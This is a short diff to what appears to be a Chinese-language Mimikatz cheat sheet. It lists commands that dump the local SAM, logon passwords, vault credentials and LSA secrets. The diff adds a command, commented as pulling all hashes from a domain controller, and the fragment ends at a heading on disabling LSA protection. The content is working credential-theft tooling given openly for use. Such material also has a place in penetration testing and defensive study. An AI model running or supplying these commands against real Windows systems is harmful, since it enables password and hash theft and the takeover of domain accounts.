@@ -69,7 +69,7 @@ privilege::debug
 # 本地sam文件
 lsadump::sam
 
-#抓取密码
+#抓取所有登录密码
 sekurlsa::logonpasswords
 
 # ekeys
@@ -80,6 +80,9 @@ vault::cred /patch
 
 # 转存lsa的secrets
 lsadump::secrets
+
+# 从DC中下载所有哈希
+lsadump::lsa /patch
 ```
 
 # 禁用LSA保护
